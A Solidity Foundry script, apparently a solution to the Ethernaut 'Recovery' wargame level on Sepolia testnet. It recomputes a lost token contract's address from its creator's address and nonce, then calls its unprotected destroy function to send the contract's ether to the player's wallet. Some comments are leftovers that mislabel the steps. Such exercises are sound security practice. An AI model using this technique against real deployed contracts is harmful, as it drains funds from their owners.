// SPDX-License-Identifier: UNLICENSED

// /*
pragma solidity 0.8.19;

import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

// Recovery  contract address: "0x93AE9E5938b0Cab2F78C5ad7c7c3B72aA3E4DEab"

interface IRecovery {

}

interface ISimpleToken {
    function name() external view returns (string memory);

    function destroy(address) external;
}

contract TriggerAttack is Script {
    IRecovery public recovery;
    ISimpleToken public simpleToken;

    address recoveryAddr = 0x93AE9E5938b0Cab2F78C5ad7c7c3B72aA3E4DEab;
    address player = 0x0b9e2F440a82148BFDdb25BEA451016fB94A3F02;
    address simpleTokenAddr;

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        // address account = vm.addr(privateKey);

        simpleTokenAddr = recoverAddr(recoveryAddr);

        // Create an instance of preservation contract
        vm.startBroadcast(privateKey);
        simpleToken = ISimpleToken(simpleTokenAddr);
        vm.stopBroadcast();

        // Create an instance of Library contract
        vm.startBroadcast(privateKey);
        simpleToken.destroy(player);
        vm.stopBroadcast();
    }

    // write a function the computes the address of simpleToken from its sender address and nonce
    // https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed
    // The sender address is the recovery contract address since its the bridge between the SimpleToken and the Creator
    // The nonce is assumed to be one
    function recoverAddr(address _sender) internal pure returns (address) {
        address contractAddr = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            _sender,
                            bytes1(0x01)
                        )
                    )
                )
            )
        );
        return contractAddr;
    }
}

// */
// forge script script/TriggerAttack.s.sol:TriggerAttack --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv
